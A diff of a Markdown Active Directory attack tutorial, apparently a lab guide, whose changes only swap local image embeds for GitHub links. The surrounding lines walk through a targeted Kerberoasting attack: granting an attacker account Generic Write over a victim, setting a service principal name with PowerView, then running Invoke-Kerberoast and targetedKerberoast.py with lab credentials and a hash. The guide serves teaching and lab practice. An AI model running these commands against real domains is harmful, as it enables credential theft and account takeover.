@@ -986,25 +986,25 @@ Get-DomainComputer DC01  | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofo
 
 1. Create two users (VictimTK) and (AttackerTK). Go to Server Manager -> Tools -> Active Directory Users and Computers. Right click on Users and click New -> User. Fill in all the details.
 
-![[Pasted image 20210817214807.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817214807.png)
 
-![[Pasted image 20210817214846.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817214846.png)
 
-![[Pasted image 20210817214910.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817214910.png)
 
 2. Right Click on VitmTK and click on Properties. Go to Security Tab  (If you cannot see it just go to View -> Advanced Features).
 
-![[Pasted image 20210817215211.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817215211.png)
 
 3. Click on Advanced -> Add -> Select a Principal and choose AttackerTK user.  Clear all permissions. Then we can do 2 different things whether to make this user have **Generic Write** or **Generic All**
 
 - Generic Write. Please tick on these permissions. **(Write all properties, Read permissions, All validated writes)**
 
-![[Pasted image 20210816214601.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210816214601.png)
 
 -  Generic All . Just click on **Full Control**.
 
-![[Pasted image 20210816214451.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210816214451.png)
 
 4. In this case, I will use the **Generic Write**
 
@@ -1022,11 +1022,11 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -like "*Ge
 ConvertFrom-SID S-1-5-21-1107409599-3969185633-1580028286-1115
 ```
 
-![[Pasted image 20210817222909.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817222909.png)
 
-![[Pasted image 20210817223227.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817223227.png)
 
-![[Pasted image 20210817222923.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817222923.png)
 
 ### Attack
 
@@ -1052,7 +1052,7 @@ Invoke-Kerberoast
 Set-DomainObject -Identity VictimTK -Clear serviceprincipalname
 ```
 
-![[Pasted image 20210817224108.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817224108.png)
 
 2. Having a shell of AttackerTK.
 
@@ -1068,7 +1068,7 @@ ANK/myspn'} -Credential
 Invoke-Kerberoast
 ```
 
-![[Pasted image 20210817224108.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817224108.png)
 
 3. targetedKerberoast.py
 
@@ -1081,9 +1081,9 @@ python3 targetedKerberoast.py -d bank.local -u AttackerTK -p 'Passw0rd@123!' --d
 python3 targetedKerberoast.py -d bank.local -u AttackerTK -H ':577BA934CE4EC1598BF4851AA85E465F' --dc-ip 192.168.125.136
 ```
 
-![[Pasted image 20210817230754.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817230754.png)
 
-![[Pasted image 20210817230945.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210817230945.png)
 
 
 ### References
